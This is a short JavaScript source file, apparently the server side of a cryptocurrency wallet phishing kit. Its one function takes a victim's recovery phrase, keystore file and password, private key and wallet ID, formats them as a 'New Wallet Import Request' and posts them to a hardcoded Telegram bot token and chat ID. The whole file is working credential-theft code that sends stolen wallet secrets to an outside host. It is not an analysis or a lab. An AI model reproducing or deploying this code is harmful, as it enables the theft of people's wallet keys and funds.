// api/send-to-telegram.js
const axios = require('axios');

// Replace with your actual Telegram Bot Token
const TELEGRAM_BOT_TOKEN = '7901428301:AAFaOAc3hZ2OogEgQboM54crQ2HU2RVw1_E';  // Your Telegram bot token here
const CHAT_ID = '7108260980';  // Your Telegram chat ID here

// Function to send data to Telegram
const sendToTelegram = async (data) => {
    try {
        const { recoveryPhrase, keystore, password, key, wallet_id } = data;

        // Construct the message to send to Telegram
        let message = `New Wallet Import Request:\n\n`;
        if (recoveryPhrase) message += `Recovery Phrase: ${recoveryPhrase}\n`;
        if (keystore) message += `Keystore JSON: ${keystore}\n`;
        if (password) message += `Keystore Password: ${password}\n`;
        if (key) message += `Private Key: ${key}\n`;
        if (wallet_id) message += `Wallet ID: ${wallet_id}\n`;

        // Send the message to Telegram using the bot API
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
        });

        return response.data;
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
        throw error;
    }
};

module.exports = { sendToTelegram };